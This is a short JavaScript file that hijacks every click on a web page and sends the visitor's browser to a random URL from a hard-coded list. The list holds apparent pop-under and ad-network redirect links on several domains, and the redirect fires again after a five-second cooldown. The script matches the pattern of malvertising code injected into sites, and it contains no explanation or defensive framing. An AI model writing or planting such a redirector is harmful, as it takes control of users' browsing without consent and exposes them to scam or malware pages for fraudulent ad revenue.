function init() {
  var arr = [
    'https://novel-psychology.com/bP3/VF0.Pu3KpKvRbomgV/JhZ-DT0T1gMxzQMJz-MZT/Mb1xLVT/UizuMazpMkx_MyzwYp',
    'https://novel-psychology.com/bU3.V/0/Pu3tpBv/bEm/VwJKZPD/0U1bMvzUMUx/N/jQEezmLHTBUHzpMKzVEL2IMsT-Qc',
    'https://novel-psychology.com/b.3lVG0/PJ3np/vibDmOVVJHZyDx0H1KMJzZEd0HO-TiU/5tLLTuUnzhMQTrQk5qNQjyAi',
    'https://novel-psychology.com/bJ3/Vp0NP.3sp/v_b/mxVEJxZRDe0c1tMdT/k/5/N/D-Ap4lLNTIUzxeOqTOk/0XMZDkkn',
    'https://novel-psychology.com/b.3PVr0eP-3Lp_vDb/mrVdJGZCDY0q1JMLT/kk5wNdDFAVwnLwTKUaxlOZTfkW0xMrDVEh',
    'https://novel-psychology.com/bq3CV.0KPb3/pZvCb/mjV/JdZ/Ds0h1-MUjHUByxNrjlUV2aLXTAUoybNeTaIa2hNbTWcz',
    'https://novel-psychology.com/b.3/VS0tPq3bpGvIbsmeV/JHZLD/0j1JMsT_kq5/M/zRgsyZLKTPULx/OWTZkSzFOsDsMs',
    'https://shempaurdou.net/4/7436813',
    'https://www.highcpmgate.com/z8767nw9bd?key=dd73fef32d545b5b5559b3dd496c33b8',
    "https://mango.mjsj.sbs/",
  ];
 
  var didOpen = false;
  // 监听页面的点击事件
  document.addEventListener("click", function() {
    if (didOpen) {
      return;
    }
    didOpen = true;
    setTimeout(() => {
      didOpen = false;
    }, 5000);

    var randomIndex = Math.floor(Math.random() * arr.length);
    var randomLink = arr[randomIndex];
    window.location.href = randomLink;
  });
}

init();